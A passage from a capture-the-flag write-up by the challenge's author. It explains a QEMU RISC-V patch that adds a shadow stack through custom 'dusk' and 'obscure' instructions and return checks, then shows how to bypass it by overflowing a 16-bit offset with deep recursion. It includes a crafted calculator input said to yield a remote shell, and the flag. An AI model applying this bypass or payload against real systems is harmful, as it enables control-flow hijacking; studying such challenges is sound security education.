</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+    TCGv darkest_address = get_darkest_address(ctx, dark_offset);
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+    TCGv saved_data = get_gpr(ctx, a-&gt;rs1, EXT_NONE);
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+    tcg_gen_qemu_st_tl(saved_data, darkest_address, ctx-&gt;mem_idx,
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+                       MO_ALIGN | MO_TE | size_memop(get_xlen_bytes(ctx)));
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+    tcg_gen_addi_tl(dark_offset, dark_offset, get_xlen_bytes(ctx));
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+    gen_helper_csrw(cpu_env, csr_darkoff, dark_offset);
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+    return true;
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+}
</span></span></span><span style=display:flex><span><span style=color:#a6e22e></span>diff --git a/target/riscv/translate.c b/target/riscv/translate.c
</span></span><span style=display:flex><span>index 0ee8ee147d..26db5b6f1a 100644
</span></span><span style=display:flex><span><span style=color:#f92672>--- a/target/riscv/translate.c
</span></span></span><span style=display:flex><span><span style=color:#f92672></span><span style=color:#a6e22e>+++ b/target/riscv/translate.c
</span></span></span><span style=display:flex><span><span style=color:#a6e22e></span><span style=color:#75715e>@@ -156,6 +156,12 @@ static inline int __attribute__((unused)) get_xlen(DisasContext *ctx)
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>     return 16 &lt;&lt; get_xl(ctx);
</span></span><span style=display:flex><span> }
</span></span><span style=display:flex><span> 
</span></span><span style=display:flex><span><span style=color:#a6e22e>+/* The word size for this machine mode, in bytes. */
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+static inline int __attribute__((unused)) get_xlen_bytes(DisasContext *ctx)
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+{
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+    return get_xlen(ctx) &gt;&gt; 3;
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+}
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+
</span></span></span><span style=display:flex><span><span style=color:#a6e22e></span> /* The operation length, as opposed to the xlen. */
</span></span><span style=display:flex><span> #ifdef TARGET_RISCV32
</span></span><span style=display:flex><span> #define get_ol(ctx)    MXL_RV32
</span></span><span style=display:flex><span><span style=color:#75715e>@@ -1069,6 +1075,18 @@ static uint32_t opcode_at(DisasContextBase *dcbase, target_ulong pc)
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>     return cpu_ldl_code(env, pc);
</span></span><span style=display:flex><span> }
</span></span><span style=display:flex><span> 
</span></span><span style=display:flex><span><span style=color:#a6e22e>+static TCGv get_darkest_address(DisasContext *ctx, TCGv dark_offset)
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+{
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+    TCGv dark_page = tcg_temp_new();
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+    TCGv_i32 csr_darkpage = tcg_constant_i32(CSR_DARKPAGE);
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+    gen_helper_csrr(dark_page, cpu_env, csr_darkpage);
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+    TCGv darkest_address = tcg_temp_new();
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+    tcg_gen_add_tl(darkest_address, dark_page, dark_offset);
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+    return darkest_address;
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+}
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+
</span></span></span><span style=display:flex><span><span style=color:#a6e22e></span> /* Include insn module translation function */
</span></span><span style=display:flex><span> #include &#34;insn_trans/trans_rvi.c.inc&#34;
</span></span><span style=display:flex><span> #include &#34;insn_trans/trans_rvm.c.inc&#34;
</span></span><span style=display:flex><span><span style=color:#75715e>@@ -1094,6 +1112,9 @@ static uint32_t opcode_at(DisasContextBase *dcbase, target_ulong pc)
</span></span></span><span style=display:flex><span><span style=color:#75715e></span> /* Include decoders for factored-out extensions */
</span></span><span style=display:flex><span> #include &#34;decode-XVentanaCondOps.c.inc&#34;
</span></span><span style=display:flex><span> 
</span></span><span style=display:flex><span><span style=color:#a6e22e>+/* Include Shadow extension */
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+#include &#34;insn_trans/trans_shadow.c.inc&#34;
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+
</span></span></span><span style=display:flex><span><span style=color:#a6e22e></span> /* The specification allows for longer insns, but not supported by qemu. */
</span></span><span style=display:flex><span> #define MAX_INSN_LEN  4
</span></span></code></pre></div><p>In these files lies the logic for the new instructions. They rely on <a href=https://www.qemu.org/docs/master/devel/tcg-ops.html>TCG (Tiny Code Generator)</a>, the intermediate language QEMU uses for emulation. What is modified here is part of the TCG front-end for RISC-V, meaning they define how to translate guest RISC-V instructions to TCG operations.</p><p>In a next stage, TCG operations are optimized and finally translated to the host instruction set using the corresponding TCG backend. We do not alter this part of QEMU in the challenge.</p><p>The first instruction, <code>dusk</code>, is rather short. It relies on <code>gen_helper_csrw</code>, which is a helper function handling the generation of the necessary TCG operations for a CSR write.</p><p>Here is the operation translated into pseudo-code, with the GPRs (General Purpose Register) and CPRs seen as lists:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>// dusk rs1
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>CSR[dark_page] <span style=color:#f92672>=</span> GPR[rs1]; <span style=color:#75715e>// gen_helper_csrw (CSR write)
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>CSR[dark_offset] <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; <span style=color:#75715e>// gen_helper_csrw
</span></span></span></code></pre></div><p>The instruction initializes the shadow stack, taking the base address from the content of the register <code>rs1</code>. The offset is set to <code>0</code>, &ldquo;pointing&rdquo; to the first cell of the stack, currently empty.</p><p>In the calculator, this instruction is accordingly called only once, in the function <code>blue_hour</code> at the start of <code>main</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>blue_hour</span> (<span style=color:#66d9ef>void</span>) {
</span></span><span style=display:flex><span>  <span style=color:#75715e>#ifndef SUNBATH
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>void</span> <span style=color:#f92672>*</span>page <span style=color:#f92672>=</span> <span style=color:#a6e22e>mmap</span>(NULL, <span style=color:#ae81ff>64</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>1024</span>, PROT_READ <span style=color:#f92672>|</span> PROT_WRITE,
</span></span><span style=display:flex><span>                    MAP_PRIVATE <span style=color:#f92672>|</span> MAP_ANONYMOUS <span style=color:#f92672>|</span> MAP_POPULATE, <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (page <span style=color:#f92672>==</span> MAP_FAILED) {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>error</span>(ERROR_DUSK_MMAP);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>asm</span> <span style=color:#66d9ef>volatile</span>(
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;dusk %0&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;r&#34;</span> (page)
</span></span><span style=display:flex><span>  );
</span></span><span style=display:flex><span>  <span style=color:#75715e>#endif
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>}
</span></span></code></pre></div><p>The function only does a <code>mmap</code> then forwards the returned address to the <code>dusk</code> instruction. In this shadow stack implementation, the memory region hosting the shadow stack is thus allocated directly by the protected program.</p><p><figure style=margin-top:1em;margin-bottom:1em><a href=/posts/img/ecw-2023/the-calculator-in-shadow/dusk.png target=_blank><img src=/posts/img/ecw-2023/the-calculator-in-shadow/dusk.png alt="dusk instruction"></a><figcaption style=font-weight:400;font-style:italic;margin-top:1em>The new <code>dusk</code> instruction</figcaption></figure></p><p>The second instruction, <code>obscure</code>, relies on 2 custom helper functions:</p><ul><li><code>xlen_bytes()</code>, which returns the address size for the current architecture, in bytes (In RISCV-64 it is 8).</li><li><code>get_darkest_address()</code>, which computes <code>darkest_address</code> as the sum of <code>dark_page</code> and <code>dark_offset</code>. It can be seen as the shadow stack pointer.</li></ul><p>Here is the pseudo-code for <code>get_darkest_address()</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>// get_darkest_address()
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>TCG[dark_page] <span style=color:#f92672>=</span> CSR[dark_page] <span style=color:#75715e>// gen_helper_csrr (CSR read)
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>TCG[darkest_address] <span style=color:#f92672>=</span> TCG[dark_page] <span style=color:#f92672>+</span> TCG[dark_offset] <span style=color:#75715e>// tcg_gen_add_tl (addition)
</span></span></span></code></pre></div><p>And there for <code>obscure</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>// obscure rs1
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>TCG[dark_offset] <span style=color:#f92672>=</span> CSR[dark_offset]; <span style=color:#75715e>// gen_helper_csrr
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>TCG[darkest_address] <span style=color:#f92672>=</span> <span style=color:#a6e22e>get_darkest_address</span>();
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>*</span>TCG[darkest_address] <span style=color:#f92672>=</span> GPR[rs1]; <span style=color:#75715e>// tcg_gen_qemu_st_tl (store)
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>TCG[dark_offset] <span style=color:#f92672>=</span> TCG[dark_offset] <span style=color:#f92672>+</span> <span style=color:#a6e22e>xlen_bytes</span>(); <span style=color:#75715e>// tcg_gen_addi_tl (add immediate)
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>CSR[dark_offset] <span style=color:#f92672>=</span> TCG[dark_offset]; <span style=color:#75715e>// gen_helper_csrw
</span></span></span></code></pre></div><p>The instruction realizes a push to the shadow stack. It retrieves the shadow stack pointer and stores the address passed through <code>rs1</code> in the pointed shadow stack cell. The <code>dark_offset</code> is then incremented so that it always indicates the first empty cell.</p><p>In the calculator, it is used at the beginning of every function from <code>calc.c</code>, with the <code>IN_SHADOW</code> macro:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>#ifndef SUNBATH
</span></span></span><span style=display:flex><span><span style=color:#75715e>#define IN_SHADOW \
</span></span></span><span style=display:flex><span><span style=color:#75715e>  asm volatile(   \
</span></span></span><span style=display:flex><span><span style=color:#75715e>    &#34;obscure ra&#34;  \
</span></span></span><span style=display:flex><span><span style=color:#75715e>  );
</span></span></span><span style=display:flex><span><span style=color:#75715e>#else
</span></span></span><span style=display:flex><span><span style=color:#75715e>#define IN_SHADOW
</span></span></span><span style=display:flex><span><span style=color:#75715e>#endif
</span></span></span></code></pre></div><p><figure style=margin-top:1em;margin-bottom:1em><a href=/posts/img/ecw-2023/the-calculator-in-shadow/obscure.png target=_blank><img src=/posts/img/ecw-2023/the-calculator-in-shadow/obscure.png alt="obscure instruction"></a><figcaption style=font-weight:400;font-style:italic;margin-top:1em>The new <code>obscure</code> instruction</figcaption></figure></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-diff data-lang=diff><span style=display:flex><span>diff --git a/target/riscv/insn_trans/trans_rvi.c.inc b/target/riscv/insn_trans/trans_rvi.c.inc
</span></span><span style=display:flex><span>index 4ad54e8a49..31062b27c3 100644
</span></span><span style=display:flex><span><span style=color:#f92672>--- a/target/riscv/insn_trans/trans_rvi.c.inc
</span></span></span><span style=display:flex><span><span style=color:#f92672></span><span style=color:#a6e22e>+++ b/target/riscv/insn_trans/trans_rvi.c.inc
</span></span></span><span style=display:flex><span><span style=color:#a6e22e></span><span style=color:#75715e>@@ -65,6 +65,30 @@ static bool trans_jalr(DisasContext *ctx, arg_jalr *a)
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>     }
</span></span><span style=display:flex><span> 
</span></span><span style=display:flex><span>     gen_set_gpri(ctx, a-&gt;rd, ctx-&gt;pc_succ_insn);
</span></span><span style=display:flex><span><span style=color:#a6e22e>+
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+    if (a-&gt;rd == 0 &amp;&amp; a-&gt;rs1 == xRA &amp;&amp; a-&gt;imm == 0) {
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+        TCGLabel *shadow_pact_end = gen_new_label();
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+        TCGv dark_offset = tcg_temp_new();
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+        TCGv_i32 csr_darkoff = tcg_constant_i32(CSR_DARKOFF);
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+        gen_helper_csrr(dark_offset, cpu_env, csr_darkoff);
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+        tcg_gen_brcondi_tl(TCG_COND_EQ, dark_offset, 0, shadow_pact_end);
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+        tcg_gen_addi_tl(dark_offset, dark_offset, -1 * get_xlen_bytes(ctx));
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+        gen_helper_csrw(cpu_env, csr_darkoff, dark_offset);
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+        TCGv darkest_address = get_darkest_address(ctx, dark_offset);
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+        TCGv dark_pc = tcg_temp_new();
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+        tcg_gen_qemu_ld_tl(dark_pc, darkest_address, ctx-&gt;mem_idx,
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+                           MO_ALIGN | MO_TE | size_memop(get_xlen_bytes(ctx)));
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+        tcg_gen_brcond_tl(TCG_COND_EQ, cpu_pc, dark_pc, shadow_pact_end);
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+        tcg_gen_st_tl(cpu_pc, cpu_env, offsetof(CPURISCVState, badaddr));
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+        generate_exception(ctx, RISCV_EXCP_SHADOW);
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+        gen_set_label(shadow_pact_end);
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+    }
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+
</span></span></span><span style=display:flex><span><span style=color:#a6e22e></span>     lookup_and_goto_ptr(ctx);
</span></span><span style=display:flex><span> 
</span></span><span style=display:flex><span>     if (misaligned) {
</span></span></code></pre></div><p>This part of the patch modifies the logic for the <code>jalr</code> instruction when the condition <code>a->rd == 0 && a->rs1 == xRA && a->imm == 0</code> is met. This corresponds to a <code>jalr x0, xRA, 0</code> which is what the pseudo-instruction <code>ret</code> extends to.</p><p>The pseudo-code added to the <code>ret</code> is:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>// [...] Normal jalr instruction
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>TCG[dark_offset] <span style=color:#f92672>=</span> CSR[dark_offset]; <span style=color:#75715e>// gen_helper_csrr
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>if</span> (TCG[dark_offset] <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>) <span style=color:#66d9ef>goto</span> LABEL_shadow_pact_end; <span style=color:#75715e>// tcg_gen_brcondi_tl (conditionnal jump, comparison against an immediate)
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>TCG[dark_offset] <span style=color:#f92672>=</span> TCG[dark_offset] <span style=color:#f92672>-</span> <span style=color:#a6e22e>xlen_bytes</span>(); <span style=color:#75715e>// tcg_gen_addi_tl
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>CSR[dark_offset] <span style=color:#f92672>=</span> TCG[dark_offset]; <span style=color:#75715e>// gen_helper_csrw
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>TCG[darkest_address] <span style=color:#f92672>=</span> <span style=color:#a6e22e>darkest_adress</span>();
</span></span><span style=display:flex><span>TCG[dark_pc] <span style=color:#f92672>=</span> <span style=color:#f92672>*</span>TCG[darkest_address]; <span style=color:#75715e>// tcg_gen_qemu_ld_tl (load)
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>if</span> (PC <span style=color:#f92672>==</span> TCG[dark_pc]) <span style=color:#66d9ef>goto</span> LABEL_shadow_pact_end; <span style=color:#75715e>// tcg_gen_brcond_tl (conditionnal jump)
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#75715e>// If we reach here, we trigger a shadow exception!
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>LABEL_shadow_pact_end:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// [...] Normal jalr instruction
</span></span></span></code></pre></div><p>The augmented instructions now make a pop from the shadow stack. The popped value, called <code>dark_pc</code>, is compared to the <code>pc</code> originally computed by the <code>jalr</code> instructions. If they are different, then a shadow exception is triggered.</p><p>All the logic is circumvented if the shadow stack is in its post-initialization, unused state, with the <code>dark_offset</code> containing 0.</p><p><figure style=margin-top:1em;margin-bottom:1em><a href=/posts/img/ecw-2023/the-calculator-in-shadow/ret.png target=_blank><img src=/posts/img/ecw-2023/the-calculator-in-shadow/ret.png alt="jalr instruction"></a><figcaption style=font-weight:400;font-style:italic;margin-top:1em>Addition to the <code>jalr</code> instruction</figcaption></figure></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-diff data-lang=diff><span style=display:flex><span>diff --git a/linux-user/riscv/cpu_loop.c b/linux-user/riscv/cpu_loop.c
</span></span><span style=display:flex><span>index bffca7db12..85e9bfceb0 100644
</span></span><span style=display:flex><span><span style=color:#f92672>--- a/linux-user/riscv/cpu_loop.c
</span></span></span><span style=display:flex><span><span style=color:#f92672></span><span style=color:#a6e22e>+++ b/linux-user/riscv/cpu_loop.c
</span></span></span><span style=display:flex><span><span style=color:#a6e22e></span><span style=color:#75715e>@@ -72,6 +72,17 @@ void cpu_loop(CPURISCVState *env)
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>                 goto gdbstep;
</span></span><span style=display:flex><span>             }
</span></span><span style=display:flex><span>             break;
</span></span><span style=display:flex><span><span style=color:#a6e22e>+        case RISCV_EXCP_SHADOW:
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+            fprintf(stderr, &#34;\n&#34;);
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+            fprintf(stderr, &#34;================================================\n&#34;);
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+            fprintf(stderr, &#34;Shadow exception triggered!\n&#34;);
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+            fprintf(stderr, &#34;(Conveniently handled as an illegal instruction)\n&#34;);
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+            fprintf(stderr, &#34;\n&#34;);
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+            fprintf(stderr, &#34;The current dark page is 0x&#34; TARGET_FMT_lx &#34;\n&#34;, env-&gt;dark_page);
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+            fprintf(stderr, &#34;The current dark offset is 0x%&#34; PRIx8 &#34;\n&#34;, env-&gt;dark_offset);
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+            fprintf(stderr, &#34;================================================\n&#34;);
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+            fprintf(stderr, &#34;\n&#34;);
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+            __attribute__ ((fallthrough));
</span></span></span><span style=display:flex><span><span style=color:#a6e22e></span>         case RISCV_EXCP_ILLEGAL_INST:
</span></span><span style=display:flex><span>             force_sig_fault(TARGET_SIGILL, TARGET_ILL_ILLOPC, env-&gt;pc);
</span></span><span style=display:flex><span>             break;
</span></span></code></pre></div><p>This final part handles the new shadow exception. An error message is displayed, indicating the status of the two custom registers, to help the players for debugging purposes. The exception then falls through to the standard illegal instruction and the program comes to a stop.</p><p>Let&rsquo;s get back to pwning. As mentioned earlier, the patch&rsquo;s weakness lies in the ability to overflow the <code>dark_offset</code>, encoded as an <code>uint16_t</code>. Since pushing a value on the stack (calling <code>obscure</code>) increases this offset by 8, we need at least <code>2^(16-3) = 8192</code> protected function calls to overflow the offset.</p><p>This can be achieved with the power operation which is implemented recursively by the calculator:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>handle_power</span> (<span style=color:#66d9ef>node_t</span><span style=color:#f92672>*</span> node, <span style=color:#66d9ef>int64_t</span> results[], <span style=color:#66d9ef>int64_t</span> power) {
</span></span><span style=display:flex><span>  IN_SHADOW
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (power <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span>;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>node_t</span> <span style=color:#f92672>*</span>node_l <span style=color:#f92672>=</span> node<span style=color:#f92672>-&gt;</span>content.binop.node_l;
</span></span><span style=display:flex><span>  results[node<span style=color:#f92672>-&gt;</span>content.binop.id] <span style=color:#f92672>*=</span> <span style=color:#a6e22e>get_value</span>(node_l, results);
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>handle_power</span>(node, results, <span style=color:#f92672>--</span>power);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>error_kind <span style=color:#a6e22e>do_power</span> (<span style=color:#66d9ef>node_t</span><span style=color:#f92672>*</span> node, <span style=color:#66d9ef>int64_t</span> results[]) {
</span></span><span style=display:flex><span>  IN_SHADOW
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>node_t</span> <span style=color:#f92672>*</span>node_l <span style=color:#f92672>=</span> node<span style=color:#f92672>-&gt;</span>content.binop.node_l;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>node_t</span> <span style=color:#f92672>*</span>node_r <span style=color:#f92672>=</span> node<span style=color:#f92672>-&gt;</span>content.binop.node_r;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>int64_t</span> power <span style=color:#f92672>=</span> <span style=color:#a6e22e>get_value</span>(node_r, results);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (power <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0</span>) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> ERROR_POWER_NEGATIVE;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (power <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>) {
</span></span><span style=display:flex><span>    results[node<span style=color:#f92672>-&gt;</span>content.binop.id] <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> ERROR_NO_ERROR;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  results[node<span style=color:#f92672>-&gt;</span>content.binop.id] <span style=color:#f92672>=</span> <span style=color:#a6e22e>get_value</span>(node_l, results);
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>handle_power</span>(node, results, <span style=color:#f92672>--</span>power);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> ERROR_NO_ERROR;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>We can use a value larger than 8192, for instance 10000: the extra function calls pass the overflow will just return and the <code>dark_offset</code> will stop at zero.</p><p>Further return operations will keep the offset at 0 and the shadow stack disabled. Even if we call a protected function at some point, re-enabling the shadow stack at this moment, this function will eventually return.</p><p>This behaviour is actually used in the program: the <code>main</code> function is not protected and can therefore make use of <code>libc</code> functions. Once <code>main</code> calls <code>secure_calc</code>, the shadow stack is used and then it is only possible to use protected functions (this implied that I had, for instance, to implement a custom <code>memzero</code> function inside <code>calc.c</code>). After <code>secure_calc</code> returns, it is possible to use unprotected <code>libc</code> functions again.</p><p>Hence, the shadow stack bypass will work whenever it happens during the calculation, and we can just adapt the previous payload by replacing a <code>(1)(1)</code> operation with <code>(1**10000)</code>, resulting in:</p><pre tabindex=0><code>(1**10000)(1)(1)(1)(1)(1)(1)(1)(1)(1)(1)(1)(1)(0+1-1)+(0*0*0+274886825460+0+700628+0-798784)
</code></pre><p>This finally gives us a remote shell, and the flag: <code>ECW{1n57ruc710n_5375_w4n7_70_b3_fr33}</code> (a reference to <a href=https://www2.eecs.berkeley.edu/Pubs/TechRpts/2014/EECS-2014-146.pdf>a milestone paper in RISC-V early history</a>).</p><p>As a sidenote, this implementation of a shadow stack has other flaws. Namely, no special permission is set up in the MMU for the memory region hosting the shadow stack (which lies in user space). Therefore, the memory here is freely mutable by an attacker with a write primitive, bypassing the protection.</p><p>If you are interested in further resources on the subject, an official draft specification for an official RISC-V shadow stack is available with the Zicfiss extension, part of the <a href=https://github.com/riscv/riscv-cfi>RISC-V CFI Specification</a>. There is also a corresponding <a href=https://www.mail-archive.com/qemu-devel@nongnu.org/msg938627.html>attempted QEMU PR</a>.</p><h1 id=conclusion>Conclusion</h1><p>Ever since my student days when I learned about shadow stacks, it had always been a frustration of mine not having the occasion to actually implement one, so now things are settled.</p><p>It was my first time designing a challenge, and I would like to thank my colleagues for their precious feedback, tips and testing without which this challenge wouldn&rsquo;t be as it is.</p><p>Finally, thanks to all the players who attempted to solve The Calculator in Shadow, I hope I was able to convey my enthusiasm for RISC-V with you!</p></div><footer class=post-footer><div class=post-footer-data><div class=tags><div class=tag><a href=/tags/ctf>#CTF</a></div><div class=tag><a href=/tags/writeup>#Writeup</a></div><div class=tag><a href=/tags/ecw-2023>#ECW 2023</a></div><div class=tag><a href=/tags/exploit>#Exploit</a></div><div class=tag><a href=/tags/qemu>#QEMU</a></div><div class=tag><a href=/tags/riscv>#RISCV</a></div></div><span class=date>2023-11-07
<span class=author>by
Anthony REMY</span></span></div></footer></article><footer><div class=social-links-footer><a href=mailto:contact@thalium.re><div class=social-link>Email</div></a><a href=https://github.com/thalium target=_blank><div class=social-link>GitHub</div></a><a href=https://twitter.com/thalium_team target=_blank><div class=social-link>Twitter</div></a></div><div class=copyright>Copyright (c) 2020, all rights reserved.</div><div class=poweredby>Powered by <a href=https://gohugo.io/>Hugo</a>.</div></footer></div></body></html>